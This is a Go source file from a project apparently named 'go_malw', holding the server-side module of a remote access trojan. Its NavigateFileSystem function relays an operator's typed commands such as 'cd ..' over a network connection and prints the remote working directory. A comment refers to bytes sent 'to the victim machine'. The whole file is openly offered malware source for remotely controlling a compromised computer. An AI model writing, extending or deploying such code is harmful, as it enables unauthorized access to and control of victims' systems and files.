package Move

import (
	"bufio"
	"fmt"
	"go_malw/server/core/color"
	"net"
	"os"
	"strings"
)

func NavigateFileSystem(connection net.Conn) (err error) {
	ConnectionReader := bufio.NewReader(connection)
	initial_pwd_raw, err := ConnectionReader.ReadString('\n')
	initial_pwd := strings.TrimSuffix(initial_pwd_raw, "\n")

	i := 10
	i = i + 1

	loopControl := true

	for loopControl {
		fmt.Print("\n" + color.Purple + initial_pwd + " >> " + color.Reset)
		// C:\Windows\go\src\ >> cd ..
		CommandReader := bufio.NewReader(os.Stdin)

		user_command_raw, err := CommandReader.ReadString('\n')
		if err != nil {
			fmt.Println(color.Red + "[-]" + color.Reset + " Unable to read command")
		}

		nbytes, err := connection.Write([]byte(user_command_raw))
		//fmt.Println("[+] ", nbytes, " were sent to the victim to the victim machine")
		//initial_pwd_raw = strconv.Itoa(nbytes)
		i = nbytes

		if user_command_raw == "stop\n" {
			loopControl = false
			break
		}

		new_pwd, err := ConnectionReader.ReadString('\n')
		//fmt.Println(color.Green+"[+]"+color.Reset+" Working Directory Changed to ", color.Purple+new_pwd+color.Reset)
		initial_pwd = new_pwd
	}
	return
}
